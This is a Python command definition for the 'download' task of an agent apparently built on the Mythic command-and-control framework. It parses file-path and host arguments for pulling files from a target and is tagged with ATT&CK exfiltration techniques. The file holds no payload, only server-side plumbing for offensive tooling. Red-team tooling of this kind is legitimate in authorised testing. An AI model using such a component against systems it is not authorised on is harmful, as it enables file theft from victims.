import json

from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class DownloadArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="path",
                type=ParameterType.String,
                default_value="",
                parameter_group_info=[ParameterGroupInfo(ui_position=0, required=True)],
            ),
            CommandParameter(
                name="host",
                type=ParameterType.String,
                default_value="",
                parameter_group_info=[ParameterGroupInfo(ui_position=1, required=False)],
            ),
        ]

    async def parse_dictionary(self, dictionary_arguments):
        """File browser sends {host, path, file, full_path}. Use full_path."""
        if "host" in dictionary_arguments and dictionary_arguments.get("full_path"):
            self.set_arg("path", dictionary_arguments["full_path"])
            if dictionary_arguments.get("host"):
                self.set_arg("host", dictionary_arguments["host"])
        else:
            self.load_args_from_dictionary(dictionary_arguments)

    async def parse_arguments(self):
        cl = self.command_line.strip()
        if len(cl) == 0:
            raise Exception("download requires a file path.")
        if cl.startswith("{"):
            try:
                data = json.loads(cl)
                if "host" in data and data.get("full_path"):
                    self.set_arg("path", data["full_path"])
                    if data.get("host"):
                        self.set_arg("host", data["host"])
                    return
                elif "path" in data:
                    self.set_arg("path", data["path"])
                    return
            except Exception:
                pass
        self.set_arg("path", cl)


class DownloadCommand(CommandBase):
    cmd = "download"
    needs_admin = False
    help_cmd = "download [path]"
    description = "Download a file from target. Single-chunk (≤50MB)."
    version = 1
    author = "@zumpyx"
    argument_class = DownloadArguments
    attackmapping = ["T1041", "T1105"]
    attributes = CommandAttributes(
        spawn_and_injectable=False,
        supported_os=[SupportedOS.Windows, SupportedOS.Linux],
        builtin=False,
        load_only=False,
        suggested_command=False,
        supported_ui_features=["file_browser:download"],
    )

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(TaskID=taskData.Task.ID, Success=True)
        response.DisplayParams = taskData.args.get_arg("path")
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
